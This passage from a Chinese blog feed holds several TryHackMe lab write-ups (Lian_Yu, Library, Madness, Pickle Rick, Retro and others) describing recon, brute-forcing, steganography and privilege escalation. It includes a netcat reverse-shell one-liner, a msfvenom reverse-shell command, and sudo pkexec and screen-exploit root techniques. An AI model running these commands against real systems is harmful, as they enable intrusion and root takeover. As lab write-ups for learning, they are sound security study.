<p>这个文件指向了<code>/etc/copy,sh</code>，让我们去看看这是什么</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat copy.sh	</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>
<p>很明显就是一个后门，让我们把这个反弹的连接指向我们。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_netcat LHOST&#x3D;10.1.1.1 LPORT&#x3D;1234 R</span><br></pre></td></tr></table></figure>
<p>使用msf生成payload，将内容替换。</p>
<p>查看一下看有没有sudo<br><img src="https://images.atsud0.me/images/post/Screenshot_20200501_225107.jpg" alt="sudo"></p>
<p>允许任何人无需密码的以root身份执行这个文件。</p>
<p>接下来就简单了，nc打开简单，执行这个文件就好了。</p>
<p>拿到shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200501_221931.jpg" alt="root"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>比较简单，培养渗透思维。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Lian_Yu</title>
    <url>/2020/05/23/TryHackMe-Lian-Yu/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/lianyu" title="" target="">靶机链接：Lian_Yu</a>
<p>靶机难度：简单 <del>卡了我一天的简单难度靶机？</del><br><del><strong>我真的菜。</strong></del></p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">IP=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">ports=$(nmap -p- --min-rate=1000  -T4 <span class="variable">$&#123;IP&#125;</span> | grep ^[0-9] | cut -d <span class="string">'/'</span> -f 1 | tr <span class="string">'\n'</span> <span class="string">','</span> | sed s/,$//)  </span><br><span class="line"></span><br><span class="line">/usr/bin/nmap -sC -sV -p<span class="variable">$&#123;ports&#125;</span> <span class="variable">$&#123;IP&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200523_202923.jpg" alt="nmap"></p>
<p>目录探测<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_203411.jpg" alt="gobu"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200523_203645.jpg" alt="index.."></p>
<p>emmm..因为不是php的文件,不能进行传值.要不然,我就试试传值code word了..只能进行目录探测,因为题目已经提示是四个数字的目录.所以我们需要生成一个字典文件.(另外在这个页面你需要查看源代码,,否则你会遗漏点东西)<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_204216.jpg" alt=""><br>可以看到有一个用户名在这里.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -t %%%% -o num.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200523_204007.jpg" alt="num"></p>
<blockquote>
<p>How Oliver Queen finds his way to Lian_Yu?</p>
</blockquote>
<p>我没看过绿箭侠我怎么知道..<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_204307.jpg" alt=""></p>
<p>继续查看源代码找线索<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_204353.jpg" alt=".ticket"></p>
<p>.ticket? 文件后缀名?有可能是要继续进行目录下的文件探测..<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_204701-1.jpg" alt="ticket"></p>
<p>好吧,我们拿到船票了。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200523_204857.jpg" alt=""></p>
<p>看起来像是base加密过的可以来这里进行解码<a href="https://gchq.github.io/CyberChef/" title="" target="">各类解码</a></p>
<p>解码获得密码后，可以直接连接ftp看看有什么东西了。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200523_205451.jpg" alt=""><br>这里只能一个一个文件下载下来看了。下载回来之后只在<code>.other_user</code>找到一个小故事，里面有几个人名。其他文件都没能找到有用的线索。<br>下载回来的图片文件，两个png和一个jpg。</p>
<ul>
<li>Leave_me_alone.png</li>
<li>Queen’s_Gambit.png</li>
<li>aa.jpg<br>其中<code>Leave_me_alone.png</code>是坏的，先不管。用<code>zsteg</code>尝试提取<code>Queen&#39;s_Gambit.png</code>，很遗憾。没有东西。<br>分析<code>aa.jpg</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e aa.jpg</span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br></pre></td></tr></table></figure>
用空密码也提取不了文件。</li>
</ul>
<p>尝试修复<code>Leave_me_alone.png</code>也失败了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_210056.jpg" alt="wunai"></p>
<p>我卡在这里一下午了。最后得到高人指点。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_210251.jpg" alt=""></p>
<blockquote>
<p>always try password for steghide</p>
</blockquote>
<p>记住了，下次遇到图片文件，都给它跑个弱密码字典提取试试。</p>
<p>最后会提取到一个<code>ss.zip</code>解压后就是我们需要的ssh密码了。但是我们不知道用户名。结合之前，我们在<code>.other_user</code>看到的小故事，用里面的第一个人名试试<code>slade</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_210729.jpg" alt="ssh-log"></p>
<p>登录成功。进来的第一件事当然是看看<code>sudo -l</code>啦<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_210845.jpg" alt=""></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>有相关程序能sudo?那第一件事当然是看看<a href="https://gtfobins.github.io/#" title="" target="">GTFOBins</a>里面有没有提权姿势啦。</p>
<p>但是很遗憾，没有。只能去看看谷歌了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200523_211045.jpg" alt=""></p>
<p>发现有一个漏洞利用程序，而且目标机器的内核也低于5.1.17。可以尝试一下<a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-13272" title="" target="">CVE-2019-13272</a>兴高采烈的下好<code>exploit</code>，结果在机器上一运行就不行了。<br><img src="https://img2018.cnblogs.com/blog/1047246/201910/1047246-20191022152758694-430075689.png" alt=""></p>
<p>好吧，认真看看漏洞描述吧。<code>loser</code></p>
<blockquote>
<p>In the Linux kernel before 5.1.17,<br>ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship,<br>which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship,<br>where a parent drops privileges and calls execve (potentially allowing control by an attacker).<br>One contributing factor is an object lifetime issue (which can also cause a panic).<br>Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit’s pkexec helper with PTRACE_TRACEME.<br>NOTE: SELinux deny_ptrace might be a usable workaround in some environments.</p>
</blockquote>
<blockquote>
<p>在5.1.17之前的Linux内核中，kernel / ptrace.c中的ptrace_link错误地处理了想要创建ptrace关系的进程的凭据记录，这允许本地用户通过利用父子的某些方案来获取root访问权限 进程关系，父进程删除权限并调用execve（可能允许攻击者控制）。一个影响因素是对象寿命问题（也可能导致恐慌）。 另一个影响因素是将ptrace关系标记为特权，这可以通过（例如）Polkit的pkexec帮助程序与PTRACE_TRACEME进行利用。<br>注意：在某些环境中，SELinux deny_ptrace可能是一种可用的解决方法。</p>
</blockquote>
<blockquote><p>总结<br>总体来看这个漏洞的限制还是比较大的<br>首先要找到一个内部有减权的 suid 程序就比较难了<br>pkexec 是linux 桌面 freedestop 上的验证程序，也就是说非桌面版本就可能没有这个东西，要用它也只能在桌面上。<br>像 android ，它把 suid 程序都去除了这个漏洞就几乎造不成什么影响。<br>这个漏洞和之前的 usb creator 漏洞差不多，实际应用上感觉都有点鸡肋。</p>
<footer><strong>rtfingc</strong><cite><a href="https://www.anquanke.com/post/id/183528" target="_blank" rel="noopener">CVE-2019-13272 'PTRACE_TRACEME' 本地提权漏洞分析</a></cite></footer></blockquote>

<p>而我们的目标机器是没有桌面的，那这个漏洞利用就宣告彻底失败了。不过，让我们回过头来看看，我们这可以用sudo去运行啊，为什么要纠结于这个漏洞利用呢？</p>
<blockquote><p>pkexec 可以通过 –user 参数授权特定的用户执行命令，没有指定的话默认为root权限</p>
<footer><strong>rtfingc</strong><cite><a href="https://www.anquanke.com/post/id/183528" target="_blank" rel="noopener">CVE-2019-13272 PTRACE_TRACEME 本地提权漏洞分析</a></cite></footer></blockquote>

<p>所以其实我们可以直接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pkexec --user root whoami</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200523_212103.jpg" alt=""></p>
<p>好，成功了。接下来怎么做还需要我说吗？直接打开一个<code>shell</code>就好啦。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>always try password for steghide</li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>GTFOBins-pkexec</tag>
        <tag>CVE-2019-13272</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Library</title>
    <url>/2020/05/05/TryHackMe-Library/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机在线链接:<a href="https://tryhackme.com/room/bsidesgtlibrary" target="_blank" rel="noopener">Library</a><br>靶机难度:简单</p>
<a id="more"></a>

<p>nmap扫描之后发现两个端口</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_215926.jpg" alt="nmap"></p>
<p><code>gobuster</code>探测路径.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_221433.jpg" alt="dis"></p>
<p>发现有robots.txt<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_221826.jpg" alt="rockyou"></p>
<p>rockyou字典文件？<br>之后我就没有再发现其他什么线索了。</p>
<p>尝试使用hydra爆破ssh密码</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200502_210342.jpg" alt="ssh-password"></p>
<p>用爆破到的ssh密码成功登录</p>
<p>拿到第一个flag<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_210016.jpg" alt="user-flag"></p>
<p>同时我们也发现了一个bak.py的脚本文件。</p>
<p>查看sudo权限<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_222816.jpg" alt="sudo"></p>
<p>我们可以以root用户的身份执行这个bak.py文件</p>
<p>但是这个文件我们没有修改权限，查看内容看能不能做什么小动作</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_222730.jpg" alt="bak"></p>
<p>这个文件我看了半天看不出什么有什么可利用的地方，如果你认为可以，麻烦请告诉我。</p>
<p>这里我尝试了许多办法，尝试往/var/www/html里面写<code>-T</code>和<code>--unzip-command=&#39;sh -c sh&#39;</code>都没作用（zip提权<br><a href="http://huaidan.org/archives/2810.html" target="_blank" rel="noopener">python提权</a><br><a href="https://www.freebuf.com/articles/system/206007.html" target="_blank" rel="noopener">zip提权</a><br>我还尝试了劫持python模块文件，但是都不行。(因为劫持python模块文件同样是属于环境变量劫持,但是普通用户并没有权限去修改root用户的环境变量.所以不可行.</p>
<p>结果最后的办法是把这文件删除了，新建一个同名的文件，内容是我们的shell却可以了。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200503_223449.jpg" alt="root"></p>
<p>真是秀啊。。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Madness</title>
    <url>/2020/06/14/TryHackMe-Madness/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/madness" title="" target="">在线靶机链接</a>

<p>一个很坑的靶机</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_172036.jpg" alt=""></p>
<p>路径探测不出来什么东西，就不放出来了。</p>
<p>访问网站后，会发现左上角没有找到的图片很显眼。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_173318.jpg" alt=""></p>
<p>将图片下载下来后，查看文件头是Png的文件头，手动修复成JFIF文件头就好了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_173454.jpg" alt=""></p>
<p>查看修复好的图片，会给出一个隐藏的路径，十分的复杂，怪不得扫不出来。</p>
<p>访问后的网站首页为<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_173621.jpg" alt=""><br>右键查看源代码后会发现给出了密码的范围提示0-99<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_173719.jpg" alt=""></p>
<p>但是不知道要怎么传值，直接试试get型传值，<code>?secret=1</code>刷新后，发现页面密码值更改了。接下来就可以用bp的爆破模块来得到一个密码值。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_173959.jpg" alt=""></p>
<p>用这个得到的密码，提取thm.jpg的隐藏文件。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_174150.jpg" alt=""><br>得到了一个’用户名’，不过要rot13处理才能得到真正的用户名。现在我们有了用户名，但是没有密码。这里我被卡住了很久，没想到作者把图片隐藏在这里。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_174340.jpg" alt=""><br>提取之后，也是一个文本内容。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_174454.jpg" alt=""></p>
<p>之后用真正的用户名和密码ssh连接上去就好了。这个用户没有sudo权限，所以先搜索suid位文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_174810.jpg" alt=""></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>当我看到screen-4.5.0的时候就知道稳了。<a href="https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh" title="" target="">exploit</a><br>下载exp到目标机器，运行就直接getshell了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200614_175201.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知道了screnn4.5的漏洞利用，如果screen是能sudo执行的话，就直接</p>
<pre><code class="shell">sudo screen</code></pre>
<p>就可以拿shell，但是如果是suid位文件的话，就不能这么利用了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.exploit-db.com/exploits/41154" title="" target="">GNU Screen 4.5.0 - Local Privilege Escalation</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/screen/" title="" target="">gtfobins-screen</a>
</li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>steganography</tag>
        <tag>screen-4.5.0</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Ninja-Skills</title>
    <url>/2020/05/08/TryHackMe-Ninja-Skills/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机链接:<a href="https://tryhackme.com/room/ninjaskills" target="_blank" rel="noopener">Ninja Skills</a></p>
<p>难度:中等(如果对linux不够熟悉那就是很难)</p>
<p>目地是<strong>高效</strong>的完成任务.</p>
<a id="more"></a>

<blockquote>
<p>Answer the questions about the following files:<br>    8V2L<br>    bny0<br>    c4ZX<br>    D8B3<br>    FHl1<br>    oiMO<br>    PFbD<br>    rmfX<br>    SRSq<br>    uqyw<br>    v2Vb<br>    X1Uy<br>The aim is to answer the questions as efficiently as possible.</p>
</blockquote>
<p>先写一个脚本文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">a&#x3D;(&#39;8V2L&#39; &#39;bny0&#39; &#39;c4ZX&#39; &#39;D8B3&#39; &#39;FHl1&#39; &#39;oiMO&#39; &#39;PFbD&#39; &#39;rmfX&#39; &#39;SRSq&#39; &#39;uqyw&#39; &#39;v2Vb&#39; &#39;X1Uy&#39;)</span><br><span class="line"></span><br><span class="line">#echo $&#123;a[@]&#125;</span><br><span class="line"></span><br><span class="line">for i in $&#123;a[@]&#125;</span><br><span class="line">do</span><br><span class="line">        find &#x2F; -name &quot;$i&quot; 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><blockquote>
<p>Q:Which of the above files are owned by the best-group group(enter the answer separated by spaces in alphabetical order)</p>
</blockquote>
<p><code>bash 1.sh|xargs ls -l</code></p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash 1.sh|xargs grep -E -o &quot;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span><br><span class="line">&#x2F;opt&#x2F;oiMO:1.1.1.1</span><br></pre></td></tr></table></figure>

<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash 1.sh|xargs md5sum</span><br></pre></td></tr></table></figure>

<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>找不到一个文件,推断出只有那个文件是230行<br><code>bash 1.sh|xargs wc -l</code></p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -user 502 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>查看 ## 1的结果</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>xargs</code>有些命令无法接受管道符的输入,所以就要使用到这个命令</p>
<p><code>md5sum</code> 计算md5哈希值<br><code>([0-9]{1,3}[\.]){3}[0-9]{1,3}</code>正则表达式筛选ip</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Pickle Rick</title>
    <url>/2020/05/07/TryHackMe-Pickle-Rick/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机在线链接:<a href="https://tryhackme.com/room/picklerick" target="_blank" rel="noopener">Pickle Rick</a></p>
<p>靶机难度:十分简单</p>
<a id="more"></a>
<p>扫描端口后会发现目标只开启了两个端口</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200507_091412.jpg" alt="nmap"></p>
<p>使用<code>gobuster</code>探测网站路径后,发现有登录页面</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200507_100644.jpg" alt="gobuster"></p>
<p>robots的内容看不懂,但是有可能是个提示.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200507_091914.jpg" alt="robots"></p>
<p>进去网站页面后,开启开发者工具审计网页源代码的时候发现有用户名<br><img src="https://images.atsud0.me/images/post/Screenshot_20200507_100948.jpg" alt="index"></p>
<p>网站后台登录页面,<br>虽然我们有用户名,但是没有密码,想到之前robots的意义不明的字符串,决定拿它来登录试试</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200507_100904.jpg" alt="login"><br>没想到登录成功了,可以发现这是一个可以执行命令的web shell,所以直接使用msf生成一个payload.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200507_101020.jpg" alt="web"></p>
<p>使用msfvemon生成一个nc shell.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200507_100802.jpg" alt="msf-shell"><br>(这里用php的反弹shell也能进去)</p>
<p>获得反弹shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200507_094337.jpg" alt="shell"></p>
<p>原本想用python生成tty的,结果目标环境没有安装python<br><img src="https://images.atsud0.me/images/post/Screenshot_20200507_100408.jpg" alt="nopython"></p>
<p>获得<code>shell</code>之后,可以发现第一个flag就在<code>/var/www/html</code>下</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200507_100533.jpg" alt="falg1"></p>
<p>切换目录到/home下后,会发现有两个用户的家目录,rick和ubuntu</p>
<p>我先去了名为ubuntu的用户下,但是没有找到任何东西,.ssh也是只允许root访问.</p>
<p>cd到rick下第二个flag就在rick下<br><img src="https://images.atsud0.me/images/post/Screenshot_20200507_095935.jpg" alt="secflag"></p>
<p><code>sudo -l</code> 查看用户可使用的sudo权限,…. 可直接使用所有的root命令<br><img src="https://images.atsud0.me/images/post/Screenshot_20200507_095816.jpg" alt="sudo"></p>
<p>第三个flag<br><img src="https://images.atsud0.me/images/post/Screenshot_20200507_100011.jpg" alt="three"></p>
<p>没啥帮助的一个靶机,,</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Retro</title>
    <url>/2020/10/17/TryHackMe-Retro/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>难度：简单</p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://images.atsud0.me/images/post/image-20200930114911464.png" alt="image-20200930114911464"></p>
<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p><img src="https://images.atsud0.me/images/post/image-20200930115719108.png" alt="image-20200930115719108"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200930115642890.png" alt="image-20200930115642890"></p>
<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://ip/retro -e u</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] URL: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F; [10.10.59.241]</span><br><span class="line">[+] Started: Wed Sep 30 04:29:59 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - Server: Microsoft-IIS&#x2F;10.0                                                                      |  - X-Powered-By: PHP&#x2F;7.1.29</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http:&#x2F;&#x2F;codex.wordpress.org&#x2F;XML-RPC_Pingback_API</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_ghost_scanner</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;dos&#x2F;http&#x2F;wordpress_xmlrpc_dos</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_xmlrpc_login</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.rapid7.com&#x2F;db&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;http&#x2F;wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%                                                                                    | References:</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.iplocation.net&#x2F;defend-wordpress-from-ddos</span><br><span class="line"> |  - https:&#x2F;&#x2F;github.com&#x2F;wpscanteam&#x2F;wpscan&#x2F;issues&#x2F;1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;index.php&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.2.1&lt;&#x2F;generator</span><br><span class="line">&gt;</span><br><span class="line"> |  - http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;index.php&#x2F;comments&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.2.1&lt;&#x2F;generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: 90s-retro</span><br><span class="line"> | Location: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;</span><br><span class="line"> | Latest Version: 1.4.10 (up to date)</span><br><span class="line"> | Last Updated: 2019-04-15T00:00:00.000Z</span><br><span class="line"> | Readme: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;readme.txt</span><br><span class="line"> | Style URL: http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;style.css?ver&#x3D;5.2.1</span><br><span class="line"> | Style Name: 90s Retro</span><br><span class="line"> | Style URI: https:&#x2F;&#x2F;organicthemes.com&#x2F;retro-theme&#x2F;</span><br><span class="line"> | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 9</span><br><span class="line">0s!? Probably n...</span><br><span class="line"> | Author: Organic Themes</span><br><span class="line"> </span><br><span class="line"> [+] The external WP-Cron seems to be enabled: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-cron.php         [13&#x2F;1922]</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https:&#x2F;&#x2F;www.iplocation.net&#x2F;defend-wordpress-from-ddos</span><br><span class="line"> |  - https:&#x2F;&#x2F;github.com&#x2F;wpscanteam&#x2F;wpscan&#x2F;issues&#x2F;1299</span><br><span class="line">                                                                                                     [+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;index.php&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.2.1&lt;&#x2F;generator</span><br><span class="line">&gt;</span><br><span class="line"> |  - http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;index.php&#x2F;comments&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.2.1&lt;&#x2F;</span><br><span class="line">generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: 90s-retro</span><br><span class="line"> | Location: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;</span><br><span class="line"> | Latest Version: 1.4.10 (up to date)</span><br><span class="line"> | Last Updated: 2019-04-15T00:00:00.000Z</span><br><span class="line"> | Readme: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;readme.txt</span><br><span class="line"> | Style URL: 